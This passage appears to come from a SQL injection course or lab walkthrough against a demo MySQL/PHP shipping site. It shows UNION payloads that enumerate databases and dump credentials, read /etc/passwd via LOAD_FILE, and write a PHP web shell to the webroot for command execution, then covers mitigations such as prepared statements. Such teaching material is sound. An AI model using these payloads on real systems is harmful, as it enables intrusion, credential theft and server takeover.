  AND password='0f359740bd1cda994f8b55330c86d845';
```

**Evaluation**

* `username='admin'` → TRUE
* `id > 1` → FALSE
* `(TRUE AND FALSE)` → FALSE
* Login fails.

***

#### Failed Comment Injection Due to Syntax

**Injected username**

```
admin'--
```

**Resulting query**

```sql
SELECT * FROM logins
WHERE (username='admin'--' AND id > 1)
  AND password='437b930db84b8079c2dd804a71936b5f';
```

**What is visible**

* SQL syntax error is returned.

**Inline decoding**

* The comment removes the remainder of the expression.
* The opening parenthesis `(` is never closed.
* SQL parsing fails before execution.

***

#### Balancing Parentheses to Restore Valid SQL

**Injected username**

```
admin')--
```

**Resulting query**

```sql
SELECT * FROM logins
WHERE (username='admin')--' AND id > 1)
  AND password='437b930db84b8079c2dd804a71936b5f';
```

**What is visible**

* The injected `)` closes the open parenthesis.
* All remaining logic is commented out.
* The query is syntactically valid again.

***

#### Effective Executed Query

```sql
SELECT * FROM logins
WHERE (username='admin');
```

**Effect**

* Only the username check is evaluated.
* The admin row is returned.
* Authentication is bypassed successfully.

***

### Union Clause

#### UNION (Baseline Behavior)

**Example: view contents of a single table**

```sql
SELECT * FROM ports;
```

**Visible result**

```
+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
```

***

**Example: view contents of another table**

```sql
SELECT * FROM ships;
```

**Visible result**

```
+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
```

***

#### UNION Combining Results

**Example: combine two SELECT statements**

```sql
SELECT * FROM ports
UNION
SELECT * FROM ships;
```

**Visible result**

```
+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
```

**Inline decoding**

* `UNION` merges result sets vertically.
* Output column names are taken from the first SELECT.
* Rows from both tables appear in a single result set.

***

#### Column Count Requirement

**Example: mismatched column counts**

```sql
SELECT city FROM ports
UNION
SELECT * FROM ships;
```

**Visible result**

```
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

**Inline decoding**

* Every SELECT in a UNION must return the same number of columns.
* Column datatypes must also be compatible by position.

***

#### UNION in SQL Injection Context

**Original vulnerable query**

```sql
SELECT * FROM products
WHERE product_id = 'user_input';
```

**Injected payload**

```sql
1' UNION SELECT username, password FROM passwords-- '
```

**Final executed query**

```sql
SELECT * FROM products
WHERE product_id = '1'
UNION
SELECT username, password FROM passwords-- ';
```

**What is visible**

* Results from `products` and `passwords` are merged.
* Data from an unrelated table is returned in the same response.

***

#### Handling Uneven Columns (Padding)

**Constraint**

* Original query and injected query must return the same number of columns.

***

**Example: original query returns two columns**

```sql
SELECT * FROM products;
```

**Injected UNION selecting only one real column**

```sql
UNION SELECT username, 2 FROM passwords
```

**Final query**

```sql
SELECT * FROM products
WHERE product_id = '1'
UNION
SELECT username, 2 FROM passwords;
```

**Visible result**

```
+-----------+-----------+
| product_1 | product_2 |
+-----------+-----------+
| admin     | 2         |
+-----------+-----------+
```

**Inline decoding**

* `2` is filler data to satisfy column count.
* Filler values must match the expected datatype.
* Numeric fillers are commonly used for simplicity.

***

#### Padding with Multiple Columns

**Example: original query returns four columns**

```sql
SELECT * FROM products;
```

**Injected UNION**

```sql
UNION SELECT username, 2, 3, 4 FROM passwords-- '
```

**Final executed query**

```sql
SELECT * FROM products
WHERE product_id = '1'
UNION
SELECT username, 2, 3, 4 FROM passwords-- ';
```

**Visible result**

```
+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
| admin     | 2         | 3         | 4         |
+-----------+-----------+-----------+-----------+
```

**Inline decoding**

* Attacker-controlled data appears in the column position of `username`.
* Numeric fillers occupy unused columns.
* Column position determines where extracted data is visible.

***

#### Using NULL as Filler

**Example**

```sql
UNION SELECT username, NULL, NULL, NULL FROM passwords-- '
```

**Inline decoding**

* `NULL` is valid for most datatypes.
* Commonly used in real-world SQL injection.
* Reduces datatype mismatch errors.

***

#### Practical Outcome of UNION Injection

**What UNION enables**

* Extract data from arbitrary tables.
* Combine attacker-selected data with legitimate query output.
* Read database contents directly through application responses.

**Constraint that always applies**

* Column count and datatype alignment must match the original query.

***

### Union Injection

#### Observable baseline behavior

**Initial request (no injection)**

Result shows three visible fields rendered as a table:

* Port Code
* Port City
* Port Volume

Example rows rendered:

```
CN SHA | Shanghai | 37.13
CN SHE | Shenzhen | 23.97
```

***

#### Error-based discovery (confirming injection point)

**Injected input**

```sql
'
```

**Observed behavior**

The page returns a SQL syntax error instead of results.

Key observable change:

* Normal table output disappears
* SQL error message is rendered

This establishes:

* User input is concatenated into a SQL query
* Errors are reflected to the client
* Union-based injection is viable because query results are normally rendered

***

#### Detecting number of columns using ORDER BY

**ORDER BY mechanics (decoded inline)**

* `ORDER BY n` means “sort by the nth selected column”
* If `n` exceeds the number of columns in the SELECT statement, the database errors
* `--` begins a SQL comment
* The trailing space after `--` is required by many SQL parsers

***

**ORDER BY 1**

```sql
' order by 1-- -
```

**Observed behavior**

* Page renders normal table output
* No error

Conclusion:

* At least 1 column exists

***

**ORDER BY 2**

```sql
' order by 2-- -
```

**Observed behavior**

* Table still renders
* Row ordering changes

Conclusion:

* At least 2 columns exist
* Sorting affects visible output, confirming the column is rendered

***

**ORDER BY 3 and ORDER BY 4**

```sql
' order by 3-- -
' order by 4-- -
```

**Observed behavior**

* Table continues to render
* Ordering continues to change

Conclusion:

* At least 4 columns exist

***

**ORDER BY 5 (failure point)**

```sql
' order by 5-- -
```

**Observed behavior**

* SQL error: unknown column in ORDER BY clause
* Table output disappears

Conclusion:

* The SELECT statement contains exactly **4 columns**
* Highest successful ORDER BY index equals column count

***

#### Detecting number of columns using UNION

**UNION mechanics (decoded inline)**

* `UNION SELECT` must match:
  * Number of columns
  * Column order
* Mismatch causes an error instead of output
* This method fails until the column count is correct

***

**UNION with 3 columns (failure)**

```sql
cn' UNION select 1,2,3-- -
```

**Observed behavior**

* SQL error stating mismatched column count
* No table output

Conclusion:

* Fewer than required columns

***

**UNION with 4 columns (success)**

```sql
cn' UNION select 1,2,3,4-- -
```

**Observed behavior**

* Table renders
* Visible output shows: `2 | 3 | 4`

Conclusion:

* UNION column count matches original query
* Confirms **4 total columns**

***

#### Identifying visible (printed) columns

**Observing which columns render**

Injected payload returns values `1, 2, 3, 4`, but only the following appear:

```
2 | 3 | 4
```

Observable facts:

* Column 1 does not render
* Columns 2, 3, and 4 render to the page

Conclusion:

* Injection output must be placed in columns 2–4
* Any data in column 1 will not be visible

***

#### Verifying data extraction (non-numeric test)

**Purpose of numeric placeholders**

* Numeric literals (`1,2,3,4`) make column position mapping visible
* Replacing one literal with a function tests real data extraction

***

**Version extraction test**

```sql
cn' UNION select 1,@@version,3,4-- -
```

Inline decoding:

* `@@version` returns the database server version string

**Observed behavior**

Rendered output includes:

```
10.3.22-MariaDB-1ubuntu1 | 3 | 4
```

Conclusion:

* Arbitrary query output can be rendered
* Column 2 is a valid injection location
* Union-based extraction is confirmed functional

***

## Exploitation

### Database Enumeration

#### MySQL fingerprinting via observable behavior

**Version string extraction (full output available)**

```sql
cn' UNION select 1,@@version,3,4-- -
```

Inline decoding:

* `@@version` returns the DBMS version string if supported
* Requires visible (printed) column placement

**Observed output**

```
10.3.22-MariaDB-1ubuntu1 | 3 | 4
```

Conclusion:

* DBMS is MariaDB (MySQL-compatible)
* Direct query output is available
* No blind or numeric-only fingerprinting required

***

**Alternative MySQL-only probes (behavior reference)**

```sql
SELECT POW(1,1);
```

* Returns `1` on MySQL
* Errors on non-MySQL DBMS

```sql
SELECT SLEEP(5);
```

* Delays response by \~5 seconds on MySQL
* No delay on non-MySQL DBMS

(No execution required here due to direct version output already observed.)

***

#### INFORMATION\_SCHEMA usage (cross-database enumeration)

Inline decoding:

* `INFORMATION_SCHEMA` is a metadata database
* Tables must be referenced with `database.table`
* Default query context remains the application database

***

#### Enumerating databases (SCHEMATA)

**Local reference query**

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

**Observed structure**

```
mysql
information_schema
performance_schema
ilfreight
dev
```

Inline decoding:

* `SCHEMA_NAME` holds database names
* First three are default system databases

***

**Injection-based enumeration**

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

**Observed output**

```
information_schema | 3 | 4
ilfreight           | 3 | 4
dev                 | 3 | 4
performance_schema  | 3 | 4
mysql               | 3 | 4
```

Conclusion:

* Non-default databases: `ilfreight`, `dev`

***

#### Identifying active database

```sql
cn' UNION select 1,database(),2,3-- -
```

Inline decoding:

* `database()` returns the current query context database

**Observed output**

```
ilfreight | 2 | 3
```

Conclusion:

* Application queries run against `ilfreight`
* `dev` is a separate database of interest

***

#### Enumerating tables (TABLES)

Inline decoding:

* `TABLE_NAME` is the table identifier
* `TABLE_SCHEMA` indicates owning database
* Filtering avoids cross-database noise

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4
from INFORMATION_SCHEMA.TABLES
where table_schema='dev'-- -
```

**Observed output**

```
credentials | dev | 4
framework   | dev | 4
pages       | dev | 4
posts       | dev | 4
```

Conclusion:

* Four tables exist in `dev`
* `credentials` is a high-value target

***

#### Enumerating columns (COLUMNS)

Inline decoding:

* `COLUMN_NAME` lists field names
* Filtering by table name narrows scope

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA
from INFORMATION_SCHEMA.COLUMNS
where table_name='credentials'-- -
```

**Observed output**

```
username | credentials | dev
password | credentials | dev
```

Conclusion:

* `credentials` table contains `username` and `password`

***

#### Dumping table data

Inline decoding:

* `dev.credentials` uses `database.table` notation
* Injected fields must occupy printed columns

```sql
cn' UNION select 1,username,password,4 from dev.credentials-- -
```

**Observed output**

```
admin      | <hash> | 4
dev_admin  | <hash> | 4
api_key    | <value>| 4
```

Conclusion:

* Full data extraction achieved
* Sensitive credentials successfully retrieved

***

### Reading Files

#### Privilege requirements (observable constraints)

Inline decoding:

* File read operations in MySQL require the `FILE` privilege
* Privileges are bound to the database user, not the web application user
* DBA or superuser roles commonly include `FILE`

***

#### Identifying current database user

**User identification queries**

```sql
SELECT USER();
SELECT CURRENT_USER();
SELECT user FROM mysql.user;
```

Injection variant (printed column placement):

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

**Observed output**

```
root@localhost | 3 | 4
```

Conclusion:

* Active DB user is `root`
* Highly likely to be a DBA-level account

***

#### Enumerating user privileges

**Superuser privilege check**

Inline decoding:

* `super_priv = 'Y'` indicates superuser status

```sql
cn' UNION SELECT 1, super_priv, 3, 4
FROM mysql.user
WHERE user="root"-- -
```

**Observed output**

```
Y | 3 | 4
```

Conclusion:

* Superuser privileges confirmed

***

**Full privilege enumeration**

Inline decoding:

* `information_schema.user_privileges` lists granted global privileges
* `grantee` identifies the user-host tuple

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4
FROM information_schema.user_privileges
WHERE grantee="'root'@'localhost'"-- -
```

**Observed output (sample)**

```
'root'@'localhost' | SELECT | 4
'root'@'localhost' | INSERT | 4
'root'@'localhost' | UPDATE | 4
'root'@'localhost' | FILE   | 4
```

Conclusion:

* `FILE` privilege is present
* File read operations are permitted

***

#### Reading files with LOAD\_FILE()

**LOAD\_FILE mechanics (decoded inline)**

* `LOAD_FILE(path)` returns file contents as a string
* Requires:
  * `FILE` privilege
  * OS-level read permission for MySQL process
* Output must be placed in a printed column

***

**Reading `/etc/passwd`**

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

**Observed output (excerpt)**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

Conclusion:

* Arbitrary system file read confirmed
* DBMS runs with sufficient OS privileges

***

#### Reading application source code

**Target identification**

Observable facts:

* Current endpoint: `search.php`
* Default Apache web root: `/var/www/html`

***

**Reading PHP source**

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

**Observed behavior**

* Browser renders HTML output
* Viewing page source (`Ctrl+U`) reveals embedded PHP source

**Observed content (summary)**

* PHP code constructs SQL query using `port_code`
* Direct string concatenation used
* Database query execution visible

Conclusion:

* Full application source disclosure achieved
* Credentials and additional vulnerabilities may be extractable

***

### Writing Files

#### Preconditions for file writes (MySQL/MariaDB)

Inline decoding:

* `FILE` privilege: required for read/write file functions and `INTO OUTFILE`
* `secure_file_priv`: server-side restriction on allowed read/write directories
* OS permissions: the MySQL process user must be able to write to the target path

Required conditions (as stated in source):

* User has `FILE` privilege
* `secure_file_priv` is not restricting writes (`""` empty) and not `NULL`
* Target directory is writable by the MySQL process user

***

#### Checking `secure_file_priv` (write restriction control)

**Baseline query (non-UNION)**

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Constraint (decoded inline):

* `SHOW` is not directly embedded inside a `UNION SELECT` payload
* Use `information_schema.global_variables` instead

`information_schema.global_variables` fields:

* `variable_name`
* `variable_value`

Targeted query:

```sql
SELECT variable_name, variable_value
FROM information_schema.global_variables
WHERE variable_name="secure_file_priv";
```

UNION injection payload (4-column requirement preserved via junk data):

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4
FROM information_schema.global_variables
WHERE variable_name="secure_file_priv"-- -
```

**Observed output**

Rendered row includes:

```
SECURE_FILE_PRIV | 3 | 4
```

Observable inference from source statement:

* The `variable_value` is empty (`""`), meaning no directory restriction

Conclusion:

* `secure_file_priv = ""` (empty) permits read/write anywhere (subject to OS permissions)

***

#### Writing files with `SELECT ... INTO OUTFILE`

Inline decoding:

* `INTO OUTFILE '/path/file'` writes the full result set of the `SELECT` to a new file
* The file is created by the MySQL process user
* The written content is the row output of the SELECT, not just the injected string

***

**Exporting table output to a file (server-side proof)**

```sql
SELECT * FROM users INTO OUTFILE '/tmp/credentials';
```

Observed file content (as shown via shell on server):

```
analyst@AcmeCorp.local[/srv]$ cat /tmp/credentials

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

***

**Writing an arbitrary string to a file (standalone proof)**

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

Observed file content:

```
analyst@AcmeCorp.local[/srv]$ cat /tmp/test.txt

this is a test
```

Observed file metadata:

```
analyst@AcmeCorp.local[/srv]$ ls -la /tmp/test.txt

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

Conclusion:

* File is owned by `mysql:mysql`
* Confirms DBMS writes as the MySQL service OS user

Tip (decoded inline):

* `FROM_BASE64("...")` can be used to write longer or binary content by decoding base64 server-side

***

#### Writing files through SQL injection (webroot write test)

Target path:

* Web root assumed: `/var/www/html` (Apache default)

Goal:

* Write a proof file accessible via the web application

Standalone SQL:

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

UNION injection payload (4 columns):

```sql
cn' union select 1,'file written successfully!',3,4
into outfile '/var/www/html/proof.txt'-- -
```

**Observed browser response**

* Empty table rendered
* No error message displayed

**Observed verification via web access**

* File exists and is readable through the web server
* Rendered content shows the full UNION row:

```
1 file written successfully! 3 4
```

Conclusion:

* Write succeeded into webroot
* `INTO OUTFILE` wrote the entire UNION result set, including junk columns

Cleanup refinement (decoded inline):

* Replace numeric junk with empty strings to avoid extra tokens in file output

***

#### Writing a PHP web shell (RCE via webroot)

Web shell content:

```php
<?php system($_REQUEST[0]); ?>
```

Inline decoding:

* `system(...)` executes an OS command
* `$_REQUEST[0]` reads parameter `0` from query string or POST body

UNION injection payload (clean output via empty strings):

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", ""
into outfile '/var/www/html/shell.php'-- -
```

**Observed browser response**

* Empty table rendered
* No error message displayed

**Observed command execution via web request**

* Visiting `/shell.php?0=id` returns command output

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Conclusion:

* Remote command execution confirmed
* Commands run under the web server OS account (`www-data`)

***

## Mitigations

### Mitigating SQL Injection

#### Input sanitization (escaping special characters)

**Vulnerable pattern (direct string concatenation)**

```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
  echo "Executing query: " . $query . "<br /><br />";

  if (!mysqli_query($conn ,$query))
  {
          die('Error: ' . mysqli_error($conn));
  }

  $result = mysqli_query($conn, $query);
  $row = mysqli_fetch_array($result);
<SNIP>
```

Inline decoding:

* `$_POST['username']`, `$_POST['password']`: user-controlled request body inputs
* Query is built by concatenating raw input into SQL text
* Any injected quote (`'` / `"`) changes SQL structure because it is interpreted as SQL syntax

**Observable behavior in prior exploit model**

* Injected quotes cause SQL errors or allow altered predicates
* Query text is printed via `echo "Executing query: " ...`, making successful injection easier to iterate

***

**Escaping input with `mysqli_real_escape_string()`**

```php
<SNIP>
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
<SNIP>
```

Inline decoding:

* `mysqli_real_escape_string($conn, $value)` escapes characters like `'` and `"` so they are treated as data, not SQL delimiters

**Observed behavior (as stated)**

* Injection attempts fail because embedded quotes are escaped, preventing SQL structure changes

Related function (identifier fidelity):

* `pg_escape_string()` serves the same purpose for PostgreSQL

***

#### Input validation (rejecting nonconforming data)

**Vulnerable pattern (direct use of GET parameter)**

```php
<?php
if (isset($_GET["port_code"])) {
    $q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
    $result = pg_query($conn,$q);
    
    if (!$result)
    {
           die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
    }
<SNIP>
?>
```

Inline decoding:

* `$_GET["port_code"]`: user-controlled URL parameter
* `ilike`: case-insensitive pattern match (PostgreSQL)
* `'%...%'`: wildcard match, expands attack surface because injected symbols are inside SQL text

***

**Restricting allowed characters with `preg_match()`**

```php
<SNIP>
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
<SNIP>
```

Inline decoding:

* `preg_match($pattern, $code)`: returns whether `$code` matches the regex
* `/^[A-Za-z\s]+$/`:
  * `^` start of string
  * `[A-Za-z\s]+` one or more letters or whitespace
  * `$` end of string
* Any other character (e.g., `'`, `;`, `-`) triggers termination via `die(...)`

Injection test payload (rejected):

```sql
'; SELECT 1,2,3,4-- -
```

**Observed behavior (as stated)**

* Input containing injected query tokens is rejected by the server
* Normal search UI remains, but injected request does not execute

***

#### User privileges (least privilege DB accounts)

Inline decoding:

* DBMS users can be restricted to specific operations and objects
* Web applications should not use superusers/DBA accounts

***

**Creating a restricted MariaDB user**

```
MariaDB [(none)]> CREATE USER 'reader'@'localhost';

Query OK, 0 rows affected (0.002 sec)
```

```
MariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';

Query OK, 0 rows affected (0.000 sec)
```

Inline decoding:

* `'reader'@'localhost'`: DB user bound to local host origin
* `GRANT SELECT ON ilfreight.ports`: only allows reading that single table
* `IDENTIFIED BY '...'`: sets password at grant time (as shown)

***

**Verifying restricted access**

Login:

```
analyst@AcmeCorp.local[/srv]$ mysql -u reader -p
```

Listing allowed table after selecting database:

```
MariaDB [(none)]> use ilfreight;
MariaDB [ilfreight]> SHOW TABLES;

+---------------------+
| Tables_in_ilfreight |
+---------------------+
| ports               |
+---------------------+
1 row in set (0.000 sec)
```

Enumerating databases (limited visibility shown):

```
MariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| information_schema |
| ilfreight          |
+--------------------+
2 rows in set (0.000 sec)
```

Attempting unauthorized table read:

```
MariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;
ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'
```

Conclusion:

* Application user can access only the required `ports` table
* Access to `credentials` is denied, containing blast radius if SQL injection exists

***

#### Web Application Firewall (WAF)

Inline decoding:

* WAF inspects HTTP requests for malicious patterns and blocks them before reaching application logic
* Examples:
  * ModSecurity (open-source)
  * Cloudflare (premium)

Rule example (as stated):

* Requests containing `INFORMATION_SCHEMA` may be rejected due to common SQLi enumeration patterns

***

#### Parameterized queries (prepared statements)

**Vulnerable pattern replacement: placeholders + bind**

```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
<SNIP>
```

Inline decoding:

* `?` placeholders: positions for user data, not SQL text
* `mysqli_prepare(...)`: compiles SQL with placeholders
* `mysqli_stmt_bind_param($stmt, 'ss', ...)`:
  * `'ss'` means two string parameters
  * values are supplied separately from SQL structure
* Driver escapes and binds values so injected quotes do not alter SQL grammar

**Observable effect (as stated)**

* Quotes in input are treated as literal characters inside parameter values, not delimiters

***
